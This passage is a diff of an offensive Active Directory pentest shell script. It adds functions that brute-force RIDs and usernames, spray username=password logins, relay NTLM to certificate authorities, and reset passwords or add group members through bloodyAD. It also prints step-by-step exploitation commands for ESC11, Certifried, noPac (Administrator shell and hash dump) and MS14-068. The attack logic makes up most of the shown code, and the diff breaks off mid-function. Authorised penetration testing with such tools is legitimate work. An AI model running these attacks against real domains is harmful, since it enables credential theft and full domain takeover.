+    esc11_vuln=$(/usr/bin/jq -r '."Certificate Authorities"[] | select (."[!] Vulnerabilities"."ESC11") | ."CA Name"' "${output_dir}/ADCS/vuln_${dc_domain}_Certipy.json" 2>/dev/null | sort -u)
+    if [[ ! -z $esc11_vuln ]]; then
+        echo -e "${GREEN}[+] ESC11 vulnerability potentially found! Follow steps below for exploitation:${NC}"
+        for vulntemp in $esc11_vuln; do
+            echo -e "${YELLOW}# ${vulntemp} certificate authority${NC}"
+            echo -e "${CYAN}1. Start the relay server (relay to the Certificate Authority and request certificate via ICPR):${NC}"
+            echo -e "ntlmrelayx.py -t rpc://PKI_Server -rpc-mode ICPR -icpr-ca-name $vulntemp -smb2support"
+            echo -e "${CYAN}2. Coerce Domain Controller:${NC}"
+            echo -e "${coercer} coerce ${argument_coercer} -t ${i} -l $attacker_IP --dc-ip $dc_ip"
+        done
+    fi
+}
+
+certifried_check () {
+    if [[ ! -f "${certipy}" ]] ; then
+        echo -e "${RED}[-] Please verify the installation of certipy${NC}"
+    else
+        echo -e "${BLUE}[*] Certifried Vulnerability Check${NC}"
+        if [ "${nullsess_bool}" == true ] ; then
+            echo -e "${PURPLE}[-] certipy requires credentials${NC}"
+        else
+            ne_adcs_enum
+            current_dir=$(pwd)
+            cd ${output_dir}/Credentials
+            i=0
+            for pki_server in $pki_servers; do
+                i=$((i + 1))
+                pki_ca=$(echo -e $pki_cas | sed -n ${i}p)
+                run_command "${certipy} req ${argument_certipy} -dc-ip ${dc_ip} -ns ${dc_ip} -dns-tcp -target ${pki_server} -ca ${pki_ca} -template User" 2>&1 | tee ${output_dir}/Vulnerabilities/certifried_check_${pki_server}_${dc_domain}.txt
+                if [[ ! $(grep "Certificate object SID is" ${output_dir}/Vulnerabilities/certifried_check_${pki_server}_${dc_domain}.txt 2>/dev/null) ]] && [[ ! $(grep "error" ${output_dir}/Vulnerabilities/certifried_check_${pki_server}_${dc_domain}.txt 2>/dev/null) ]]; then
+                    echo -e "${GREEN}[+] ${pki_server} potentially vulnerable to Certifried! Follow steps below for exploitation:${NC}"
+                    echo -e "${CYAN}1. Create a new computer account with a dNSHostName property of a Domain Controller:${NC}"
+                    echo -e "${certipy} account create ${argument_certipy} -user NEW_COMPUTER_NAME -pass NEW_COMPUTER_PASS -dc-ip $dc_ip -dns $dc_NETBIOS.$dc_domain"
+                    echo -e "${CYAN}2. Obtain a certificate for the new computer:${NC}"
+                    echo -e "${certipy} req -u NEW_COMPUTER_NAME\$@${dc_domain} -p NEW_COMPUTER_PASS -dc-ip $dc_ip -target $pki_server -ca ${pki_ca} -template Machine"
+                    echo -e "${CYAN}3. Authenticate using pfx:${NC}"
+                    echo -e "${certipy} auth -pfx ${dc_NETBIOS}.pfx -username ${dc_NETBIOS}\$ -dc-ip ${dc_ip}"
+                    echo -e "${CYAN}4. Delete the created computer:${NC}"
+                    echo -e "${certipy} account delete ${argument_certipy} -dc-ip ${dc_ip} -user NEW_COMPUTER_NAME "                 
+                fi
+            done
+            cd ${current_dir}
+        fi
+    fi
+    echo -e ""
+}
+
+certipy_ldapshell () {
+    if [[ ! -f "${certipy}" ]] ; then
+        echo -e "${RED}[-] Please verify the installation of certipy${NC}"
+    else
+        if [ "${cert_bool}" == true ] ; then
+            echo -e "${BLUE}[*] Launching LDAP shell via Schannel using Certipy ${NC}"
+            if [ "${ldaps_bool}" == true ]; then ldaps_param=""; else ldaps_param="-ldap-scheme ldap"; fi
+            run_command "${certipy} auth -pfx ${pfxcert} -dc-ip ${dc_ip} -ns ${dc_ip} -dns-tcp ${ldaps_param}" -ldap-shell 2>&1 | tee ${output_dir}/ADCS/certipy_ldapshell_output_${dc_domain}.txt
+        else
+            echo -e "${PURPLE}[-] Certificate authentication required to open LDAP shell using Certipy${NC}"
+        fi
+    fi
+    echo -e ""
+}
+
+###### bruteforce: Brute Force attacks
+ridbrute_attack () {
+    if [ "${nullsess_bool}" == true ] ; then
+        echo -e "${BLUE}[*] RID Brute Force (Null session)${NC}"
+        run_command "${netexec} ${ne_verbose} smb ${target} ${argument_ne} --rid-brute" 2>&1 > ${output_dir}/BruteForce/ne_rid_brute_${dc_domain}.txt
+        #Parsing user lists
+        /bin/cat ${output_dir}/BruteForce/rid_brute_${dc_domain}.txt 2>/dev/null | grep "SidTypeUser" | cut -d ":" -f 2 | cut -d "\\" -f 2 | sed "s/ (SidTypeUser)\x1B\[0m//g" > ${output_dir}/DomainRecon/Users/users_list_ridbrute_${dc_domain}.txt 2>&1
+        count=$(wc -l ${output_dir}/DomainRecon/Users/users_list_ridbrute_${dc_domain}.txt | cut -d " " -f 1)
+        echo -e "${GREEN}[+] Found ${count} users using RID Brute Force${NC}"
+        parse_users
+    else
+        echo -e "${PURPLE}[-] Null session RID brute force skipped (credentials provided)${NC}"
+    fi
+    echo -e ""
+}
+
 kerbrute_enum () {
     if [ "${nullsess_bool}" == true ] ; then
         if [ ! -f "${kerbrute}" ] ; then
@@ -1345,10 +1472,10 @@ kerbrute_enum () {
         else
             echo -e "${BLUE}[*] kerbrute User Enumeration (Null session)${NC}"
             echo -e "${YELLOW}[i] Using $user_wordlist wordlist for user enumeration. This may take a while...${NC}"
-            run_command "${kerbrute} userenum ${user_wordlist} -d ${dc_domain} --dc ${dc_ip} -t 5 ${argument_kerbrute}" 2>&1 > ${output_dir}/Kerberos/kerbrute_user_output_${dc_domain}.txt
+            run_command "${kerbrute} userenum ${user_wordlist} -d ${dc_domain} --dc ${dc_ip} -t 5 ${argument_kerbrute}" 2>&1 > ${output_dir}/BruteForce/kerbrute_user_output_${dc_domain}.txt
             if [ -s "${output_dir}/DomainRecon/Users/users_list_kerbrute_${dc_domain}.txt" ] ; then
                 echo -e "${GREEN}[+] Printing valid accounts...${NC}"
-                /bin/cat ${output_dir}/DomainRecon/Users/users_list_kerbrute_${dc_domain}.txt 2>/dev/null | grep "VALID" | cut -d " " -f 8 | cut -d "@" -f 1 | tee ${output_dir}/DomainRecon/Users/users_list_kerbrute_${dc_domain}.txt 2>&1
+                /bin/cat ${output_dir}/BruteForce/kerbrute_user_output_${dc_domain}.txt 2>/dev/null | grep "VALID" | cut -d " " -f 8 | cut -d "@" -f 1 | tee ${output_dir}/DomainRecon/Users/users_list_kerbrute_${dc_domain}.txt 2>&1
                 parse_users
             fi
         fi
@@ -1358,12 +1485,31 @@ kerbrute_enum () {
     echo -e ""
 }
 
+userpass_ne_check () {
+    parse_users
+    if [ ! -s "${users_list}" ] ; then
+         echo -e "${PURPLE}[-] No users found! Please re-run users enumeration and try again..${NC}"
+    else
+        echo -e "${BLUE}[*] netexec User=Pass Check (Noisy!)${NC}"
+        echo -e "${YELLOW}[i] Finding users with Password = username using netexec. This may take a while...${NC}"
+        run_command "${netexec} ${ne_verbose} smb ${target} -u ${users_list} -p ${users_list} --no-bruteforce --continue-on-success" 2>&1 > ${output_dir}/BruteForce/ne_userpass_output_${dc_domain}.txt
+        /bin/cat ${output_dir}/BruteForce/ne_userpass_output_${dc_domain}.txt 2>&1 | grep "\[+\]" | cut -d "\\" -f 2 | cut -d " " -f 1 > "${output_dir}/BruteForce/user_eq_pass_valid_ne_${dc_domain}.txt"
+        if [ -s "${output_dir}/BruteForce/user_eq_pass_valid_ne_${dc_domain}.txt" ] ; then
+            echo -e "${GREEN}[+] Printing accounts with username=password...${NC}"
+            /bin/cat ${output_dir}/BruteForce/user_eq_pass_valid_ne_${dc_domain}.txt 2>/dev/null
+        else
+            echo -e "${PURPLE}[-] No accounts with username=password found${NC}"
+        fi
+    fi
+    echo -e ""
+}
+
 userpass_kerbrute_check () {
     if [ ! -f "${kerbrute}" ] ; then
         echo -e "${RED}[-] Please verify the location of kerbrute${NC}"
     else
         parse_users
-        user_pass_wordlist="${output_dir}/Kerberos/kerbrute_userpass_wordlist_${dc_domain}.txt"
+        user_pass_wordlist="${output_dir}/BruteForce/kerbrute_userpass_wordlist_${dc_domain}.txt"
         
         echo -e "${BLUE}[*] kerbrute User=Pass Check (Noisy!)${NC}"
         if [ -s "${users_list}" ] ; then
@@ -1373,11 +1519,11 @@ userpass_kerbrute_check () {
                 echo -e "${i}:${i}" >> "${user_pass_wordlist}"
             done
             sort -uf "${user_pass_wordlist}" -o "${user_pass_wordlist}"
-            run_command "${kerbrute} bruteforce ${user_pass_wordlist} -d ${dc_domain} --dc ${dc_ip} -t 5 ${argument_kerbrute}" 2>&1 > ${output_dir}/Kerberos/kerbrute_pass_output_${dc_domain}.txt
-            /bin/cat ${output_dir}/Kerberos/kerbrute_pass_output_${dc_domain}.txt 2>&1 | grep "VALID" | cut -d " " -f 8 | cut -d "@" -f 1 > "${output_dir}/DomainRecon/user_eq_pass_valid_kerb_${dc_domain}.txt"
-            if [ -s "${output_dir}/DomainRecon/user_eq_pass_valid_kerb_${dc_domain}.txt" ] ; then
+            run_command "${kerbrute} bruteforce ${user_pass_wordlist} -d ${dc_domain} --dc ${dc_ip} -t 5 ${argument_kerbrute}" 2>&1 > ${output_dir}/BruteForce/kerbrute_pass_output_${dc_domain}.txt
+            /bin/cat ${output_dir}/BruteForce/kerbrute_pass_output_${dc_domain}.txt 2>&1 | grep "VALID" | cut -d " " -f 8 | cut -d "@" -f 1 > "${output_dir}/BruteForce/user_eq_pass_valid_kerb_${dc_domain}.txt"
+            if [ -s "${output_dir}/BruteForce/user_eq_pass_valid_kerb_${dc_domain}.txt" ] ; then
                 echo -e "${GREEN}[+] Printing accounts with username=password...${NC}"
-                /bin/cat ${output_dir}/DomainRecon/user_eq_pass_valid_kerb_${dc_domain}.txt 2>/dev/null
+                /bin/cat ${output_dir}/BruteForce/user_eq_pass_valid_kerb_${dc_domain}.txt 2>/dev/null
             else
                 echo -e "${PURPLE}[-] No accounts with username=password found${NC}"
             fi
@@ -1388,6 +1534,27 @@ userpass_kerbrute_check () {
     echo -e ""
 }
 
+pre2k_check () {
+    if [ ! -f "${pre2k}" ] ; then
+        echo -e "${RED}[-] Please verify the installation of pre2k${NC}"
+    else
+        echo -e "${BLUE}[*] Pre2k authentication check (Noisy!)${NC}"
+        pre2k_outputfile="${output_dir}/BruteForce/pre2k_outputfile_${dc_domain}.txt"
+        if [ "${nullsess_bool}" == true ] ; then
+            if [ ! -s "${servers_hostname_list}" ] ; then
+                echo -e "${PURPLE}[-] No computers found! Please re-run computers enumeration and try again..${NC}"
+            else
+                run_command "${pre2k} unauth ${argument_pre2k} -dc-ip ${dc_ip} -inputfile ${servers_hostname_list} -outputfile ${pre2k_outputfile}" | tee "${output_dir}/BruteForceF/pre2k_output_${dc_domain}.txt"
+            fi
+        else
+            if [ "${ldaps_bool}" == true ]; then ldaps_param="-ldaps"; else ldaps_param=""; fi
+            run_command "${pre2k} auth ${argument_pre2k} -dc-ip ${dc_ip} -outputfile ${pre2k_outputfile} ${ldaps_param}" | tee "${output_dir}/BruteForce/pre2k_output_${dc_domain}.txt"
+        fi
+    fi
+    echo -e ""
+}
+
+###### kerberos: Kerberos attacks
 asrep_attack () {
     if [ ! -f "${impacket_GetNPUsers}" ]; then
         echo -e "${RED}[-] GetNPUsers.py not found! Please verify the installation of impacket${NC}"
@@ -1435,7 +1602,7 @@ asreprc4_attack () {
             if [ ! "${asrep_user}" == "" ]; then
                 current_dir=$(pwd)
                 cd ${output_dir}/Credentials
-                run_command "python3 ${CVE202233679} ${dc_domain}/${asrep_user} ${dc_domain} -dc-ip ${dc_ip} ${argument_CVE202233679}" 2>&1 | tee ${output_dir}/Kerberos/CVE-2022-33679_output_${dc_domain}.txt
+                run_command "$(which python3) ${CVE202233679} ${dc_domain}/${asrep_user} ${dc_domain} -dc-ip ${dc_ip} ${argument_CVE202233679}" 2>&1 | tee ${output_dir}/Kerberos/CVE-2022-33679_output_${dc_domain}.txt
                 cd ${current_dir}
             else
                 echo -e "${PURPLE}[-] No ASREProastable users found to perform Blind Kerberoast. If ASREProastable users exist, re-run ASREPRoast attack and try again.${NC}"
@@ -1481,21 +1648,6 @@ kerberoast_attack () {
     echo -e ""
 }
 
-targetedkerberoast_attack () {
-    if [ ! -f "${targetedKerberoast}" ] ; then
-        echo -e "${RED}[-] Please verify the location of targetedKerberoast.py${NC}"
-    else
-        if [ "${nullsess_bool}" == true ] ; then
-            echo -e "${PURPLE}[-] targetedKerberoast requires credentials${NC}"
-        else
-            echo -e "${BLUE}[*] Targeted Kerberoasting Attack (Noisy!)${NC}"
-            if [ "${ldaps_bool}" == true ]; then ldaps_param="--use-ldaps"; else ldaps_param=""; fi
-            run_command "${targetedKerberoast} ${argument_targkerb} -D ${dc_domain} --dc-ip ${dc_ip} ${ldaps_param} --only-abuse --dc-host ${dc_NETBIOS} -o ${output_dir}/Kerberos/targetedkerberoast_hashes_${dc_domain}.txt" 2>&1 | tee ${output_dir}/Kerberos/targetedkerberoast_output_${dc_domain}.txt
-        fi
-    fi
-    echo -e ""
-}
-
 krbjack_attack () {
     if [ ! -f "${krbjack}" ] ; then
         echo -e "${RED}[-] Please verify the location of krbjack${NC}"
@@ -1525,6 +1677,44 @@ kerborpheus_attack () {
             cd ${current_dir}
         fi
     fi 
+    echo -e ""
+}
+
+nopac_check () {
+    echo -e "${BLUE}[*] NoPac (CVE-2021-42278 and CVE-2021-42287) check ${NC}"
+    if [ "${kerb_bool}" == true ] ; then
+        echo -e "${PURPLE}[-] netexec's nopac does not support kerberos authentication${NC}"
+    else
+        for i in $(/bin/cat ${target_dc}); do
+            run_command "${netexec} ${ne_verbose} smb ${i} ${argument_ne} -M nopac --log ${output_dir}/Vulnerabilities/ne_nopac_output_${dc_domain}.txt" 2>&1
+            if [[ $(grep "VULNERABLE" ${output_dir}/Vulnerabilities/ne_nopac_output_${dc_domain}.txt 2>/dev/null) ]]; then
+                echo -e "${GREEN}[+] Domain controller vulnerable to noPac found! Follow steps below for exploitation:${NC}"
+                echo -e "${CYAN}# Get shell:${NC}"
+                echo -e "noPac.py ${argument_imp} -dc-ip $dc_ip -dc-host ${dc_NETBIOS} --impersonate Administrator -shell [-use-ldap]"
+                echo -e "${CYAN}# Dump hashes:${NC}"
+                echo -e "noPac.py ${argument_imp} -dc-ip $dc_ip -dc-host ${dc_NETBIOS} --impersonate Administrator -dump [-use-ldap]"
+            fi
+        done
+    fi
+    echo -e ""
+}
+
+ms14-068_check () {
+    echo -e "${BLUE}[*] MS14-068 check ${NC}"
+    if [ ! -f "${impacket_goldenPac}" ]; then
+        echo -e "${RED}[-] goldenPac.py not found! Please verify the installation of impacket${NC}"
+    else
+        if [ "${nullsess_bool}" == true ] || [ "${kerb_bool}" == true ] || [ "${aeskey_bool}" == true ]; then
+            echo -e "${PURPLE}[-] MS14-068 requires credentials and does not support kerberos authentication${NC}"
+        else
+            run_command "${impacket_goldenPac} ${argument_imp_gp}@${dc_FQDN} None -target-ip ${dc_ip}" 2>&1 | tee ${output_dir}/Vulnerabilities/ms14-068_output_${dc_domain}.txt
+            if [[ $(grep "found vulnerable" ${output_dir}/Vulnerabilities/ms14-068_output_${dc_domain}.txt 2>/dev/null) ]]; then
+                echo -e "${GREEN}[+] Domain controller vulnerable to MS14-068 found (False positives possible on newer versions of Windows)!${NC}"
+                echo -e "${CYAN}# Execute command below to get shell:${NC}"
+                echo -e "${impacket_goldenPac} ${argument_imp}@${dc_FQDN} -target-ip ${dc_ip}"
+            fi
+        fi
+    fi
     echo -e ""
 }
 
@@ -1566,11 +1756,12 @@ john_crack_kerberoast(){
     echo -e ""
 }
 
-###### Shares scan
+###### scan_shares: Shares scan
 smb_map () {
     if [ ! -f "${smbmap}" ]; then
         echo -e "${RED}[-] Please verify the installation of smbmap${NC}"
     else
+        mkdir -p ${output_dir}/Shares/smbmapDump
         echo -e "${BLUE}[*] SMB shares Scan using smbmap${NC}"
         if [ "${kerb_bool}" == true ] || [ "${aeskey_bool}" == true ]; then
             echo -e "${PURPLE}[-] smbmap does not support kerberos authentication${NC}"
@@ -1642,6 +1833,8 @@ manspider_scan () {
     if [ "${kerb_bool}" == true ] || [ "${aeskey_bool}" == true ] ; then
         echo -e "${PURPLE}[-] manspider does not support kerberos authentication${NC}"
     else
+        mkdir -p ${output_dir}/Shares/manspiderDump
+        echo -e "${CYAN}[*] Running manspider....${NC}"
         smb_scan
         echo -e "${CYAN}[*] Searching for files with interesting filenames${NC}"
         run_command "${manspider} ${argument_manspider} ${servers_smb_list} -q -t 10 -f passw user admin account network login key logon cred -l ${output_dir}/Shares/manspiderDump" 2>&1 | tee -a ${output_dir}/Shares/manspider_output_${dc_domain}.txt
@@ -1659,42 +1852,7 @@ manspider_scan () {
     fi
 }
 
-###### Vulnerability checks
-nopac_check () {
-    echo -e "${BLUE}[*] NoPac check ${NC}"
-    if [ "${kerb_bool}" == true ] ; then
-        echo -e "${PURPLE}[-] netexec's nopac does not support kerberos authentication${NC}"
-    else
-        for i in $(/bin/cat ${target_dc}); do
-            run_command "${netexec} ${ne_verbose} smb ${i} ${argument_ne} -M nopac --log ${output_dir}/Vulnerabilities/ne_nopac_output_${dc_domain}.txt" 2>&1
-            if [[ $(grep "VULNERABLE" ${output_dir}/Vulnerabilities/ne_nopac_output_${dc_domain}.txt 2>/dev/null) ]]; then
-                echo -e "${GREEN}[+] Domain controller vulnerable to noPac found! Follow steps below for exploitation:${NC}"
-                echo -e "${CYAN}# Get shell:${NC}"
-                echo -e "noPac.py ${argument_imp} -dc-ip $dc_ip -dc-host ${dc_NETBIOS} --impersonate Administrator -shell [-use-ldap]"
-                echo -e "${CYAN}# Dump hashes:${NC}"
-                echo -e "noPac.py ${argument_imp} -dc-ip $dc_ip -dc-host ${dc_NETBIOS} --impersonate Administrator -dump [-use-ldap]"
-            fi
-        done
-    fi
-    echo -e ""
-}
-
-petitpotam_check () {
-    echo -e "${BLUE}[*] PetitPotam check ${NC}"
-    for i in $(/bin/cat ${target_dc}); do
-        run_command "${netexec} ${ne_verbose} smb ${i} ${argument_ne} -M petitpotam --log ${output_dir}/Vulnerabilities/ne_petitpotam_output_${dc_domain}.txt" 2>&1
-    done
-    echo -e ""
-}
-
-dfscoerce_check () {
-    echo -e "${BLUE}[*] dfscoerce check ${NC}"
-    for i in $(/bin/cat ${target_dc}); do
-        run_command "${netexec} ${ne_verbose} smb ${i} ${argument_ne} -M dfscoerce --log ${output_dir}/Vulnerabilities/ne_dfscoerce_output_${dc_domain}.txt" 2>&1
-    done
-    echo -e ""
-}
-
+###### vuln_checks: Vulnerability checks
 zerologon_check () {
     echo -e "${BLUE}[*] zerologon check. This may take a while... ${NC}"
     for i in $(/bin/cat ${target_dc}); do
@@ -1714,25 +1872,6 @@ zerologon_check () {
     echo -e ""
 }
 
-ms14-068_check () {
-    echo -e "${BLUE}[*] MS14-068 check ${NC}"
-    if [ ! -f "${impacket_goldenPac}" ]; then
-        echo -e "${RED}[-] goldenPac.py not found! Please verify the installation of impacket${NC}"
-    else
-        if [ "${nullsess_bool}" == true ] || [ "${kerb_bool}" == true ] || [ "${aeskey_bool}" == true ]; then
-            echo -e "${PURPLE}[-] MS14-068 requires credentials and does not support kerberos authentication${NC}"
-        else
-            run_command "${impacket_goldenPac} ${argument_imp_gp}@${dc_FQDN} None -target-ip ${dc_ip}" 2>&1 | tee ${output_dir}/Vulnerabilities/ms14-068_output_${dc_domain}.txt
-            if [[ $(grep "found vulnerable" ${output_dir}/Vulnerabilities/ms14-068_output_${dc_domain}.txt 2>/dev/null) ]]; then
-                echo -e "${GREEN}[+] Domain controller vulnerable to MS14-068 found (False positives possible on newer versions of Windows)!${NC}"
-                echo -e "${CYAN}# Execute command below to get shell:${NC}"
-                echo -e "${impacket_goldenPac} ${argument_imp}@${dc_FQDN} -target-ip ${dc_ip}"
-            fi
-        fi
-    fi
-    echo -e ""
-}
-
 ms17-010_check () {
     echo -e "${BLUE}[*] MS17-010 check ${NC}"
     if [ "${kerb_bool}" == true ]; then
@@ -1741,6 +1880,22 @@ ms17-010_check () {
     fi
     smb_scan
     run_command "${netexec} ${ne_verbose} smb ${servers_smb_list} ${argument_ne} -M ms17-010 --log ${output_dir}/Vulnerabilities/ne_ms17-010_output_${dc_domain}.txt" 2>&1
+    echo -e ""
+}
+
+petitpotam_check () {
+    echo -e "${BLUE}[*] PetitPotam check ${NC}"
+    for i in $(/bin/cat ${target_dc}); do
+        run_command "${netexec} ${ne_verbose} smb ${i} ${argument_ne} -M petitpotam --log ${output_dir}/Vulnerabilities/ne_petitpotam_output_${dc_domain}.txt" 2>&1
+    done
+    echo -e ""
+}
+
+dfscoerce_check () {
+    echo -e "${BLUE}[*] dfscoerce check ${NC}"
+    for i in $(/bin/cat ${target_dc}); do
+        run_command "${netexec} ${ne_verbose} smb ${i} ${argument_ne} -M dfscoerce --log ${output_dir}/Vulnerabilities/ne_dfscoerce_output_${dc_domain}.txt" 2>&1
+    done
     echo -e ""
 }
 
@@ -1796,7 +1951,7 @@ smbsigning_check () {
     fi
     smb_scan
     run_command "${netexec} ${ne_verbose} smb ${servers_smb_list} ${argument_ne} --gen-relay-list ${output_dir}/Vulnerabilities/ne_smbsigning_output_${dc_domain}.txt" 2>&1
-    if [ ! -s ${output_dir}/Vulnerabilities/ne_smbsigning_output_${dc_domain}.txt ]; then
+    if [ ! -s "${output_dir}/Vulnerabilities/ne_smbsigning_output_${dc_domain}.txt" ]; then
         echo -e "${PURPLE}[-] No servers with SMB signing disabled found ${NC}"
     fi
     echo -e ""
@@ -1830,6 +1985,7 @@ rpcdump_check () {
     elif [ "${kerb_bool}" == true ] || [ "${aeskey_bool}" == true ]; then
         echo -e "${PURPLE}[-] rpcdump does not support kerberos authentication${NC}"
     else
+        mkdir -p ${output_dir}/Vulnerabilities/RPCDump
         echo -e "${BLUE}[*] Impacket rpcdump${NC}"
         smb_scan
         for i in $(/bin/cat ${servers_smb_list}); do
@@ -1850,10 +2006,11 @@ rpcdump_check () {
 
 coercer_check () {
     if [ ! -f "${coercer}" ] ; then
-        echo -e "${RED}[-] coercer not found! Please verify the installation of impacket${NC}"
+        echo -e "${RED}[-] Coercer not found! Please verify the installation of Coercer${NC}"
     elif [ "${kerb_bool}" == true ] || [ "${aeskey_bool}" == true ] ; then
-        echo -e "${PURPLE}[-] coercer does not support kerberos authentication${NC}"
+        echo -e "${PURPLE}[-] Coercer does not support kerberos authentication${NC}"
     else
+        mkdir -p ${output_dir}/Vulnerabilities/Coercer
         echo -e "${BLUE}[*] Running scan using coercer ${NC}"
         smb_scan
         for i in $(/bin/cat ${servers_smb_list}); do
@@ -1871,41 +2028,7 @@ coercer_check () {
     echo -e ""
 }
 
-certifried_check () {
-    if [[ ! -f "${certipy}" ]] ; then
-        echo -e "${RED}[-] Please verify the installation of certipy${NC}"
-    else
-        echo -e "${BLUE}[*] Certifried Vulnerability Check${NC}"
-        if [ "${nullsess_bool}" == true ] ; then
-            echo -e "${PURPLE}[-] certipy requires credentials${NC}"
-        else
-            ne_adcs_enum
-            current_dir=$(pwd)
-            cd ${output_dir}/Credentials
-            i=0
-            for pki_server in $pki_servers; do
-                i=$((i + 1))
-                pki_ca=$(echo -e $pki_cas | sed -n ${i}p)
-                run_command "${certipy} req ${argument_certipy} -dc-ip ${dc_ip} -ns ${dc_ip} -dns-tcp ${ldaps_param} -target ${pki_server} -ca ${pki_ca} -template User" 2>&1 | tee ${output_dir}/Vulnerabilities/certifried_check_${pki_server}_${dc_domain}.txt
-                if [[ ! $(grep "Certificate object SID is" ${output_dir}/Vulnerabilities/certifried_check_${pki_server}_${dc_domain}.txt 2>/dev/null) ]]; then
-                    echo -e "${GREEN}[+] ${pki_server} potentially vulnerable to Certifried! Follow steps below for exploitation:${NC}"
-                    echo -e "${CYAN}1. Create a new computer account with a dNSHostName property of a Domain Controller:${NC}"
-                    echo -e "${certipy} account create ${argument_certipy} -user NEW_COMPUTER_NAME -pass NEW_COMPUTER_PASS -dc-ip $dc_ip -dns $dc_NETBIOS.$dc_domain"
-                    echo -e "${CYAN}2. Obtain a certificate for the new computer:${NC}"
-                    echo -e "${certipy} req -u NEW_COMPUTER_NAME\$@${dc_domain} -p NEW_COMPUTER_PASS -dc-ip $dc_ip -target $pki_server -ca ${pki_ca} -template Machine"
-                    echo -e "${CYAN}3. Authenticate using pfx:${NC}"
-                    echo -e "${certipy} auth -pfx ${dc_NETBIOS}.pfx -username ${dc_NETBIOS}\$ -dc-ip ${dc_ip}"
-                    echo -e "${CYAN}4. Delete the created computer:${NC}"
-                    echo -e "${certipy} account delete ${argument_certipy} -dc-ip ${dc_ip} -user NEW_COMPUTER_NAME "                 
-                fi
-            done
-            cd ${current_dir}
-        fi
-    fi
-    echo -e ""
-}
-
-#MSSQL scan
+#mssql_checks: MSSQL scan
 mssql_enum () {
     if [ ! -f "${windapsearch}" ] || [ ! -f "${impacket_GetUserSPNs}" ]; then
         echo -e "${RED}[-] Please verify the location of windapsearch and GetUserSPNs.py${NC}"
@@ -1924,7 +2047,218 @@ mssql_enum () {
     echo -e ""
 }
 
-###### Password Dump
+mssql_relay_check () {
+    if [ ! -f "${mssqlrelay}" ]; then
+        echo -e "${RED}[-] Please verify the location of mssqlrelay${NC}"
+    else
+        echo -e "${BLUE}[*] MSSQL Relay Check${NC}"
+        if [ "${ldaps_bool}" == true ]; then ldaps_param=""; else ldaps_param="-scheme ldap"; fi
+        run_command "${mssqlrelay} ${mssqlrelay_verbose} checkall ${ldaps_param} ${argument_mssqlrelay} -target ${dc_FQDN} -ns ${dc_ip} -dns-tcp -windows-auth" | tee "${output_dir}/DomainRecon/mssql_relay_output_${dc_domain}.txt" 2>&1
+    fi
+    echo -e ""
+}
+
+###### Modification of AD Objects or Attributes
+targetedkerberoast_attack () {
+    if [ ! -f "${targetedKerberoast}" ] ; then
+        echo -e "${RED}[-] Please verify the location of targetedKerberoast.py${NC}"
+    else
+        if [ "${nullsess_bool}" == true ] ; then
+            echo -e "${PURPLE}[-] targetedKerberoast requires credentials${NC}"
+        else
+            echo -e "${BLUE}[*] Targeted Kerberoasting Attack (Noisy!)${NC}"
+            if [ "${ldaps_bool}" == true ]; then ldaps_param="--use-ldaps"; else ldaps_param=""; fi
+            run_command "${targetedKerberoast} ${argument_targkerb} -D ${dc_domain} --dc-ip ${dc_ip} ${ldaps_param} --only-abuse --dc-host ${dc_NETBIOS} -o ${output_dir}/Modification/targetedkerberoast_hashes_${dc_domain}.txt" 2>&1 | tee ${output_dir}/Kerberos/targetedkerberoast_output_${dc_domain}.txt
+        fi
+    fi
+    echo -e ""
+}
+
+change_pass () {
+    if [ ! -f "${bloodyad}" ] ; then
+        echo -e "${RED}[-] Please verify the installation of bloodyad{NC}"
+    else
+        mkdir -p ${output_dir}/Modification/bloodyAD
+        if [ "${aeskey_bool}" == true ] ; then
+            echo -e "${PURPLE}[-] bloodyad does not support kerberos authentication using AES Key${NC}"            
+        else
+            if [ "${ldaps_bool}" == true ]; then ldaps_param="-s"; else ldaps_param=""; fi            
+            echo -e "${BLUE}[*] Changing passwords of a user or computer account. Please specify target:${NC}"
+            target_passchange=""
+            read -p ">> " target_passchange </dev/tty
+            while [ "${target_passchange}" == "" ] ; do
+                echo -e "${RED}Invalid name.${NC} Please specify target:"
+                read -p ">> " target_passchange </dev/tty
+            done
+            echo -e "${BLUE}[*] Please specify new password:${NC}"
+            pass_passchange=""
+            read -p ">> " pass_passchange </dev/tty
+            while [ "${pass_passchange}" == "" ] ; do
+                echo -e "${RED}Invalid password.${NC} Please specify password:"
+                read -p ">> " pass_passchange </dev/tty
+            done
+            echo -e "${CYAN}[*] Changing password of ${target_passchange} to ${pass_passchange}${NC}"
+            echo "$(date +%Y-%m-%d\ %H:%M:%S); ${bloodyad} ${argument_bloodyad} ${ldaps_param} --host ${dc_ip} set password \"${target_passchange}\" \"${pass_passchange}\"" >> $command_log
+            ${bloodyad} ${argument_bloodyad} ${ldaps_param} --host ${dc_ip} set password "${target_passchange}" "${pass_passchange}" | tee -a ${output_dir}/Modification/bloodyAD/bloodyad_out_passchange_${dc_domain}.txt 
+       fi
+    fi
+    echo -e ""
+}
+
+add_group_member () {
+    if [ ! -f "${bloodyad}" ] ; then
+        echo -e "${RED}[-] Please verify the installation of bloodyad{NC}"
+    else
+        mkdir -p ${output_dir}/Modification/bloodyAD
+        if [ "${aeskey_bool}" == true ] ; then
+            echo -e "${PURPLE}[-] bloodyad does not support kerberos authentication using AES Key${NC}"            
+        else
+            if [ "${ldaps_bool}" == true ]; then ldaps_param="-s"; else ldaps_param=""; fi            
+            echo -e "${BLUE}[*] Adding user to group. Please specify target group:${NC}"
+            target_groupmem=""
+            read -p ">> " target_groupmem </dev/tty
+            while [ "${target_groupmem}" == "" ] ; do
+                echo -e "${RED}Invalid name.${NC} Please specify target group:"
+                read -p ">> " target_groupmem </dev/tty
+            done
+            echo -e "${BLUE}[*] Please specify user to add to the group (default: current user):${NC}"
+            read -p ">> " user_groupmem </dev/tty
+            if [ "${user_groupmem}" == "" ]; then user_groupmem="${user}"; fi
+            echo -e "${CYAN}[*] Adding ${user_groupmem} to group ${target_groupmem}${NC}"
+            echo "$(date +%Y-%m-%d\ %H:%M:%S); ${bloodyad} ${argument_bloodyad} ${ldaps_param} --host ${dc_ip} add groupMember \"${target_groupmem}\" \"${user_groupmem}\"" >> $command_log
+            ${bloodyad} ${argument_bloodyad} ${ldaps_param} --host ${dc_ip} add groupMember "${target_groupmem}" "${user_groupmem}" | tee -a ${output_dir}/Modification/bloodyAD/bloodyad_out_groupmem_${dc_domain}.txt 
+       fi
+    fi
+    echo -e ""
+}
+
+add_computer () {
+    if [ ! -f "${bloodyad}" ] ; then
+        echo -e "${RED}[-] Please verify the installation of bloodyad{NC}"
+    else
+        mkdir -p ${output_dir}/Modification/bloodyAD
+        if [ "${aeskey_bool}" == true ] ; then
